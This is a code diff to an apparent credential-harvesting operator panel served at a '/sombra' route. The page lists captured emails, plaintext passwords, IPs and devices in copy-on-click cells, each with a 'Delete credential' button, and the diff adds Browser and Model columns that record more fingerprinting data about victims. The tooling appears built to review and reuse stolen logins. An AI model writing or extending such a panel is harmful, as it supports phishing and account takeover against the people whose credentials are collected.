@@ -226,7 +226,7 @@
         }
 
         .container {
-            max-width: 920px;
+            max-width: 1080px;
             margin: 0 auto;
             position: relative;
             z-index: 2;
@@ -515,7 +515,7 @@
 
         th, td {
             text-align: left;
-            padding: 12px 14px;
+            padding: 10px 10px;
             font-size: 19px;
             border-bottom: 1px dashed rgba(124, 58, 237, 0.45);
             vertical-align: middle;
@@ -661,16 +661,34 @@
             text-shadow: 0 0 6px rgba(154, 160, 166, 0.4);
         }
 
-        td.device.dev-phone {
+        td.device.dev-phone,
+        td.device.dev-android {
             color: #22d3ee;
             border-color: #0891b2;
             text-shadow: 0 0 6px rgba(34, 211, 238, 0.5);
         }
 
-        td.device.dev-tablet {
+        td.device.dev-tablet,
+        td.device.dev-apple {
             color: #c084fc;
             border-color: #9333ea;
             text-shadow: 0 0 6px rgba(192, 132, 252, 0.5);
+        }
+
+        td.browser {
+            color: #fbbf24;
+            font-family: 'Press Start 2P', 'Courier New', monospace;
+            font-size: 7px;
+            letter-spacing: 1px;
+            white-space: nowrap;
+        }
+
+        td.model {
+            color: #94a3b8;
+            font-family: 'Press Start 2P', 'Courier New', monospace;
+            font-size: 6px;
+            letter-spacing: 0;
+            word-break: break-word;
         }
 
         /* ogni casella copiabile (email, password, ip) */
@@ -1161,6 +1179,8 @@
                             <th>Password</th>
                             <th>IP</th>
                             <th>DEV</th>
+                            <th>Browser</th>
+                            <th>Model</th>
                             <th>Time</th>
                             <th></th>
                         </tr>
@@ -1191,6 +1211,8 @@
                                 <td class="password copyable" data-copy="<%= user.password %>"><%= user.password %></td>
                                 <td class="ip copyable" data-copy="<%= user.ip %>"><%= user.ip %></td>
                                 <td class="device dev-<%= (user.device || 'PC').toLowerCase() %>"><%= user.device || 'PC' %></td>
+                                <td class="browser"><%= user.browser || '?' %></td>
+                                <td class="model"><%= user.model || '—' %></td>
                                 <td class="time"><%= user.time %></td>
                                 <td>
                                     <form method="POST" action="/sombra/delete/<%= user.id %>?tk=<%= tk %>" class="delete-form">
@@ -1816,6 +1838,8 @@
                     '<td class="password copyable" data-copy="' + u.password + '">' + u.password + '</td>' +
                     '<td class="ip copyable" data-copy="' + (u.ip || 'unknown') + '">' + (u.ip || 'unknown') + '</td>' +
                     '<td class="device dev-' + (u.device || 'PC').toLowerCase() + '">' + (u.device || 'PC') + '</td>' +
+                    '<td class="browser">' + (u.browser || '?') + '</td>' +
+                    '<td class="model">' + (u.model || '—') + '</td>' +
                     '<td class="time">' + u.time + '</td>' +
                     '<td><form method="POST" action="/sombra/delete/' + u.id + '?tk=' + SOMBRA_TK + '" class="delete-form">' +
                     '<button type="submit" class="delete-btn" title="Delete credential">' +
